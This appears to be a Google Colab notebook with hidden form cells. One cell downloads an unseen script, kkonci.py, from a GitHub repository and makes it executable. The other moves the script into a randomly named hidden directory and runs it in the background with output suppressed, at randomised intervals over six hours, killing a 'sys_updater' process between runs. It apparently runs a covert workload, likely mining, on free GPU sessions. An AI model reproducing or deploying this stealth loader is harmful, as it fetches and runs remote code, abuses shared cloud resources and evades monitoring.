{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "machine_shape": "hm",
      "gpuType": "A100",
      "authorship_tag": "ABX9TyNDiKcMVVdC9Qk2BD/a10Xp",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/honjiv-colab/ngaloco/blob/main/mewki.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "cellView": "form",
        "id": "Addlbz3cNVmr"
      },
      "outputs": [],
      "source": [
        "# @title mewmew\n",
        "!wget https://raw.githubusercontent.com/honjiv-colab/ngaloco/refs/heads/main/kkonci.py && chmod 777 kkonci.py -O /dev/null"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# @title gaskan\n",
        "\n",
        "import subprocess\n",
        "import time\n",
        "import random\n",
        "import os\n",
        "import sys\n",
        "import string\n",
        "\n",
        "def setup_stealth_dir():\n",
        "    random_dir = \".\" + \"\".join(random.choices(string.ascii_lowercase + string.digits, k=5))\n",
        "    stealth_path = os.path.join(os.getcwd(), random_dir)\n",
        "\n",
        "    try:\n",
        "        os.makedirs(stealth_path, exist_ok=True)\n",
        "        if os.path.exists(\"kkonci.py\"):\n",
        "            os.rename(\"kkonci.py\", os.path.join(stealth_path, \"kkonci.py\"))\n",
        "            return stealth_path\n",
        "        else:\n",
        "            return stealth_path\n",
        "    except OSError:\n",
        "        return \".\"\n",
        "\n",
        "\n",
        "def run_kkonci(duration_seconds, stealth_path):\n",
        "    try:\n",
        "        kkonci_path = os.path.join(stealth_path, \"kkonci.py\")\n",
        "\n",
        "        cmd = f\"nohup {sys.executable} {kkonci_path} > /dev/null 2>&1 & echo $!\"\n",
        "\n",
        "        pid_string = subprocess.check_output(cmd, shell=True, text=True).strip()\n",
        "        kkonci_pid = int(pid_string)\n",
        "\n",
        "        time.sleep(duration_seconds)\n",
        "\n",
        "        try:\n",
        "            os.kill(kkonci_pid, 0)\n",
        "            os.kill(kkonci_pid, 9)\n",
        "        except ProcessLookupError:\n",
        "            pass\n",
        "\n",
        "    except (subprocess.CalledProcessError, FileNotFoundError, ValueError):\n",
        "        pass\n",
        "\n",
        "\n",
        "def kill_sys_updater():\n",
        "    try:\n",
        "        subprocess.run([\"killall\", \"sys_updater\"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n",
        "    except FileNotFoundError:\n",
        "        pass\n",
        "    except Exception:\n",
        "        pass\n",
        "\n",
        "def run_random_job(min_minutes, max_minutes):\n",
        "    random_minutes = random.randint(min_minutes, max_minutes)\n",
        "    random_seconds = random_minutes * 60\n",
        "    time.sleep(random_seconds)\n",
        "\n",
        "\n",
        "def main():\n",
        "    stealth_path = setup_stealth_dir()\n",
        "\n",
        "    total_run_duration = 6 * 60 * 60\n",
        "    start_time = time.time()\n",
        "\n",
        "    while (time.time() - start_time) < total_run_duration:\n",
        "        random_seconds_kkonci_first = random.randint(40, 80)\n",
        "        run_kkonci(random_seconds_kkonci_first, stealth_path)\n",
        "\n",
        "        kill_sys_updater()\n",
        "\n",
        "        run_random_job(10, 12)\n",
        "\n",
        "        random_seconds_kkonci_second = random.randint(200, 500)\n",
        "        run_kkonci(random_seconds_kkonci_second, stealth_path)\n",
        "\n",
        "        elapsed_time = time.time() - start_time\n",
        "        if elapsed_time >= total_run_duration:\n",
        "            break\n",
        "\n",
        "    kill_sys_updater()\n",
        "\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()\n",
        "\n"
      ],
      "metadata": {
        "cellView": "form",
        "id": "mP-BZ9FoNpYU"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}